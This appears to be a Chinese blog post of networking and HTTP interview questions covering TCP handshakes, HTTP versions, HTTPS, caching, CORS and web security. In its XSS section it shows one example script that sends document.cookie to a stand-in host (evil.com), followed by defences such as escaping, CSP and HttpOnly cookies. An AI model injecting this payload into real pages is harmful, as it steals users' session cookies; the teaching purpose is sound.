---
title: '网络与 HTTP 面试题（中高级）'
published: 2026-09-16T12:00:00+08:00
description: '深入讲解 TCP/IP、HTTP/1.1 vs HTTP/2、HTTPS 握手、缓存策略、跨域解决方案、Web 安全等高频面试题。'
tags: [前端面试, HTTP, TCP, HTTPS, 跨域, 缓存]
category: 前端面试宝典
draft: false
---

> [!NOTE]
> 本文包含 25+ 道网络与 HTTP 面试题，难度标注：⭐ 基础 · ⭐⭐ 进阶 · ⭐⭐⭐ 高级 · 🔥 高频必考

---

## TCP/IP 基础

### Q1: TCP 三次握手和四次挥手？⭐⭐ 🔥

**答：**

**三次握手（建立连接）：**

```
客户端                          服务端
  │                               │
  │──── SYN(seq=x) ──────────────>│  第一次：客户端发起连接
  │                               │
  │<─── SYN+ACK(seq=y,ack=x+1) ──│  第二次：服务端确认并回应
  │                               │
  │──── ACK(ack=y+1) ────────────>│  第三次：客户端确认
  │                               │
  └───── 连接建立 ─────────────────┘
```

**为什么是三次而不是两次？** 防止过期的连接请求突然到达服务端，造成资源浪费。

**四次挥手（断开连接）：**

```
客户端                          服务端
  │                               │
  │──── FIN(seq=u) ──────────────>│  第一次：客户端请求关闭
  │                               │
  │<─── ACK(ack=u+1) ────────────│  第二次：服务端确认（可能还有数据要发）
  │                               │
  │<─── FIN(seq=w) ──────────────│  第三次：服务端也请求关闭
  │                               │
  │──── ACK(ack=w+1) ────────────>│  第四次：客户端确认，等待 2MSL
  │                               │
  └───── 连接关闭 ─────────────────┘
```

**为什么是四次？** TCP 是全双工，两个方向需要分别关闭。

**TIME_WAIT（2MSL）的作用：**
1. 确保最后的 ACK 能到达对方（重传机制）
2. 让本次连接的残留数据包在网络中消散

### Q2: TCP 和 UDP 的区别？⭐

| 特性 | TCP | UDP |
|:--|:--|:--|
| 连接 | 面向连接 | 无连接 |
| 可靠性 | 可靠（重传、排序） | 不可靠 |
| 速度 | 慢 | 快 |
| 头部 | 20 字节 | 8 字节 |
| 流量控制 | 有（滑动窗口） | 无 |
| 应用场景 | HTTP、FTP、SMTP | DNS、视频、游戏 |

---

## HTTP 协议

### Q3: HTTP 请求方法有哪些？⭐ 🔥

| 方法 | 说明 | 幂等 |
|:--|:--|:--|
| `GET` | 获取资源 | ✅ |
| `POST` | 创建资源 | ❌ |
| `PUT` | 更新资源（全量） | ✅ |
| `PATCH` | 更新资源（部分） | ❌ |
| `DELETE` | 删除资源 | ✅ |
| `HEAD` | 获取响应头 | ✅ |
| `OPTIONS` | 预检请求 | ✅ |

```javascript
// 幂等性：多次请求产生相同结果
GET /users/1        // 幂等
DELETE /users/1     // 幂等（第一次成功，后续返回 404）
POST /users         // 不幂等（每次创建新用户）
PUT /users/1        // 幂等（全量更新，结果一致）
```

### Q4: HTTP 状态码分类？⭐ 🔥

| 分类 | 含义 | 常见状态码 |
|:--|:--|:--|
| 1xx | 信息 | 100 Continue, 101 Switching Protocols |
| 2xx | 成功 | 200 OK, 201 Created, 204 No Content |
| 3xx | 重定向 | 301 永久, 302 临时, 304 Not Modified |
| 4xx | 客户端错误 | 400 参数错误, 401 未认证, 403 无权限, 404 不存在 |
| 5xx | 服务端错误 | 500 内部错误, 502 网关错误, 503 服务不可用 |

```javascript
// 301 vs 302
// 301：永久重定向，浏览器缓存，SEO 权重转移
// 302：临时重定向，不缓存

// 304：协商缓存命中，不返回 body
// 502 vs 504
// 502：上游服务返回无效响应
// 504：上游服务超时
```

### Q5: HTTP/1.1、HTTP/2、HTTP/3 的区别？⭐⭐ 🔥

**答：**

| 特性 | HTTP/1.1 | HTTP/2 | HTTP/3 |
|:--|:--|:--|:--|
| 连接 | 长连接（Keep-Alive） | 多路复用 | 多路复用 |
| 传输层 | TCP | TCP | QUIC (UDP) |
| 头部 | 文本，重复 | HPACK 压缩 | QPACK 压缩 |
| 队头阻塞 | 有（TCP 层） | 无（应用层），TCP 层仍有 | 完全解决 |
| 服务端推送 | 不支持 | 支持 | 支持 |
| 加密 | 可选 | 默认 TLS | 内置 TLS 1.3 |

**HTTP/2 多路复用：**

```
HTTP/1.1（串行请求）
请求1 → 响应1 → 请求2 → 响应2 → 请求3 → 响应3

HTTP/2（并行多路复用，同一连接）
连接 {
  Stream 1: 请求1 → 响应1
  Stream 2: 请求2 → 响应2
  Stream 3: 请求3 → 响应3
}  // 同时进行，互不阻塞
```

**HTTP/3 (QUIC) 的优势：**
- 基于 UDP，0-RTT 建连（更快）
- 彻底解决 TCP 队头阻塞
- 连接迁移（切换网络不断开）

---

## HTTPS

### Q6: HTTPS 的握手过程？⭐⭐⭐ 🔥

**答：**

```
客户端                                    服务端
  │                                         │
  │── ClientHello（支持的加密套件、随机数1）──>│
  │                                         │
  │<── ServerHello（选定加密套件、随机数2）──│
  │<── Certificate（服务端证书）────────────│
  │<── ServerHelloDone ────────────────────│
  │                                         │
  │  验证证书（CA 签名链）                   │
  │  生成随机数3（Pre-Master Secret）        │
  │                                         │
  │── ClientKeyExchange（加密的随机数3）───>│
  │── ChangeCipherSpec ───────────────────>│
  │── Finished（加密握手信息）────────────>│
  │                                         │
  │<── ChangeCipherSpec ──────────────────│
  │<── Finished ──────────────────────────│
  │                                         │
  └──── 对称加密通信 ────────────────────────┘

  会话密钥 = f(随机数1, 随机数2, 随机数3)
```

**为什么混合使用非对称加密和对称加密？**
- 非对称加密（RSA/ECDHE）：安全交换密钥，但速度慢
- 对称加密（AES）：速度快，适合大量数据传输
- 结合两者优势：用非对称加密传输对称密钥，再用对称加密传输数据

### Q7: 什么是中间人攻击？HTTPS 如何防范？⭐⭐⭐

```
中间人攻击（MITM）：
客户端 ←→ 攻击者 ←→ 服务端
（攻击者截获并篡改通信内容）

HTTPS 防范手段：
1. CA 证书验证：浏览器内置受信任的 CA 根证书
2. 证书链验证：服务器证书 → 中间 CA → 根 CA
3. 数字签名：CA 用私钥签名，客户端用公钥验证
4. HSTS：强制使用 HTTPS（HTTP Strict Transport Security）
```

---

## HTTP 缓存

### Q8: 强缓存和协商缓存？⭐⭐ 🔥

**答：**

```
浏览器请求资源
      ↓
检查强缓存（Cache-Control / Expires）
      ↓
命中 → 直接使用本地缓存（200 from disk/memory cache）
      ↓（未命中或过期）
发送请求，携带协商缓存标识
      ↓
服务端检查（Last-Modified / ETag）
      ↓
未修改 → 304 Not Modified（使用本地缓存）
已修改 → 200 OK（返回新资源）
```

**强缓存：**

```http
# Cache-Control（HTTP/1.1，优先级高）
Cache-Control: max-age=31536000        # 缓存 1 年
Cache-Control: public                  # 可被代理缓存
Cache-Control: private                 # 只能被浏览器缓存
Cache-Control: no-cache                # 不缓存，每次协商
Cache-Control: no-store                # 完全不缓存
Cache-Control: immutable               # 内容永不改变

# Expires（HTTP/1.0，绝对时间，受客户端时间影响）
Expires: Wed, 21 Oct 2026 07:28:00 GMT
```

**协商缓存：**

```http
# Last-Modified / If-Modified-Since（秒级精度）
Last-Modified: Wed, 21 Oct 2025 07:28:00 GMT
If-Modified-Since: Wed, 21 Oct 2025 07:28:00 GMT

# ETag / If-None-Match（内容 hash，更精确）
ETag: "a3f5c8b2d1"
If-None-Match: "a3f5c8b2d1"
```

**最佳实践：**

```nginx
# 静态资源（带 hash 文件名）：强缓存 1 年
location /assets/ {
  add_header Cache-Control "public, max-age=31536000, immutable";
}

# HTML 文件：协商缓存
location ~* \.html$ {
  add_header Cache-Control "no-cache";
}
```

---

## 跨域

### Q9: 什么是同源策略？跨域解决方案？⭐⭐ 🔥

**答：**

同源策略：协议 + 域名 + 端口 三者相同才是同源。

```
http://example.com       → http://example.com/api   ✅ 同源
http://example.com       → https://example.com      ❌ 协议不同
http://example.com       → http://api.example.com   ❌ 域名不同
http://example.com:80    → http://example.com:8080  ❌ 端口不同
```

**跨域解决方案：**

```javascript
// 1. CORS（推荐，服务端配置）
// 简单请求（GET/POST/HEAD，Content-Type 限制）
// 复杂请求（PUT/DELETE 等，会先发 OPTIONS 预检）

// 服务端响应头
Access-Control-Allow-Origin: http://example.com  // 或 *
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Allow-Credentials: true           // 允许携带 Cookie
Access-Control-Max-Age: 86400                    // 预检结果缓存时间

// 2. Nginx 代理（开发/生产）
// nginx.conf
location /api/ {
  proxy_pass http://backend-server/;
  proxy_set_header Host $host;
}

// 3. Webpack Dev Server 代理（开发）
// vue.config.js / webpack.config.js
devServer: {
  proxy: {
    '/api': {
      target: 'http://localhost:3000',
      changeOrigin: true,
      pathRewrite: { '^/api': '' },
    }
  }
}

// 4. JSONP（只支持 GET，已不推荐）
function jsonp(url, callback) {
  const script = document.createElement('script');
  const cbName = 'jsonp_' + Date.now();
  
  window[cbName] = (data) => {
    callback(data);
    delete window[cbName];
    document.body.removeChild(script);
  };
  
  script.src = `${url}?callback=${cbName}`;
  document.body.appendChild(script);
}
```

### Q10: CORS 预检请求（OPTIONS）什么时候触发？⭐⭐

```javascript
// 简单请求（不触发预检）
// 方法：GET / POST / HEAD
// Content-Type：
//   - text/plain
//   - multipart/form-data
//   - application/x-www-form-urlencoded

// 复杂请求（触发预检 OPTIONS）
// 1. 方法不是 GET/POST/HEAD
// 2. Content-Type 是 application/json
// 3. 自定义请求头（如 Authorization）
// 4. 使用了 ReadableStream

// 预检请求示例
OPTIONS /api/data HTTP/1.1
Origin: http://example.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Content-Type, Authorization

// 预检响应
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: http://example.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Max-Age: 86400  // 缓存 24 小时，减少预检次数
```

---

## Web 安全

### Q11: XSS 和 CSRF 攻击及防御？⭐⭐ 🔥

**XSS（跨站脚本攻击）：**

```javascript
// 存储型 XSS：恶意脚本存入数据库
// 反射型 XSS：恶意脚本在 URL 参数中
// DOM 型 XSS：前端直接操作 DOM 导致

// 攻击示例
<script>
  document.location = 'http://evil.com?cookie=' + document.cookie;
</script>

// 防御措施
// 1. 输入过滤（转义 HTML 特殊字符）
function escapeHtml(str) {
  return str.replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#x27;');
}

// 2. 输出编码（根据上下文选择）
// 3. CSP（内容安全策略）
// Content-Security-Policy: default-src 'self'; script-src 'self'

// 4. HttpOnly Cookie（防止 JS 读取 Cookie）
Set-Cookie: session=xxx; HttpOnly; Secure; SameSite=Strict
```

**CSRF（跨站请求伪造）：**

```javascript
// 攻击原理：用户登录 A 站后，访问恶意 B 站
// B 站发起对 A 站的请求，浏览器自动携带 A 站 Cookie

// 防御措施
// 1. CSRF Token（最有效）
// 服务端生成 Token，嵌入表单
<form action="/transfer" method="POST">
  <input type="hidden" name="_csrf" value="random-token">
</form>

// 2. SameSite Cookie
Set-Cookie: session=xxx; SameSite=Strict  // 完全禁止跨站携带
Set-Cookie: session=xxx; SameSite=Lax     // 允许顶级导航

// 3. 验证 Referer / Origin
// 4. 双重 Cookie 验证
```

---

## 复习卡片

| 知识点 | 关键记忆 |
|:--|:--|
| 三次握手 | SYN → SYN+ACK → ACK |
| 四次挥手 | FIN → ACK → FIN → ACK（2MSL） |
| HTTP/2 | 多路复用、头部压缩、服务端推送 |
| HTTPS | 非对称传密钥 + 对称加密数据 |
| 强缓存 | `Cache-Control: max-age` |
| 协商缓存 | `ETag` / `Last-Modified` → 304 |
| 跨域 | CORS（推荐）、代理、JSONP |
| XSS 防御 | 输入过滤 + CSP + HttpOnly |
| CSRF 防御 | CSRF Token + SameSite Cookie |

> [!TIP]
> 下一篇：[Nginx 面试题](/blog/posts/interview-guide-09-nginx/)
> 
> 涵盖反向代理、负载均衡、静态资源服务、性能优化等核心知识点。
